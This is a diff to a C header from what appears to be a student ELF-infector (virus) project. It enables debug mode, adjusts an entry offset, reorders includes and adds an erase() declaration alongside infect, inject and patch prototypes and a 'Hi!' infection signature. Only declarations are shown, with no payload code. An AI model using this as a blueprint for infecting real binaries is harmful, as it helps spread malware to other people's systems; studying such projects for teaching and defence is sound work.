@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 12:55:07 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 15:05:51 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,26 +16,26 @@
 /* Includes */
 # include <elf.h>
 # include <stdio.h>
-# include <sys/types.h>
-# include <sys/stat.h>
 # include <fcntl.h>
 # include <unistd.h>
-# include <stdbool.h>
-# include <sys/mman.h>
 # include <stdlib.h>
 # include <limits.h>
-# include <sys/ptrace.h>
+# include <stdbool.h>
 # include <sys/time.h>
-# include <sys/resource.h>
+# include <sys/mman.h>
+# include <sys/stat.h>
 # include <sys/wait.h>
-
+# include <sys/types.h>
+# include <sys/random.h>
+# include <sys/ptrace.h>
+# include <sys/resource.h>
 
 /* Enum */
 
 /* Define */
 
 // debug
-//# define DEBUG
+# define DEBUG
 
 # define SIGNATURE	0x216948	// 'Hi!'
 
@@ -49,7 +49,7 @@
 # define PROG_INFO	512
 
 # ifdef DEBUG
-#  define ENTRY_OFF	2461
+#  define ENTRY_OFF	2469
 # else
 #  define ENTRY_OFF	2453
 # endif
@@ -140,6 +140,7 @@ void			infect(t_data *data);
 void			inject(t_data *data);
 void			patch(t_data *data, uint8_t *map, size_t size);
 void			release(t_data *data);
+void			erase(t_data *data);
 void			end(t_data *data);
 
 /*
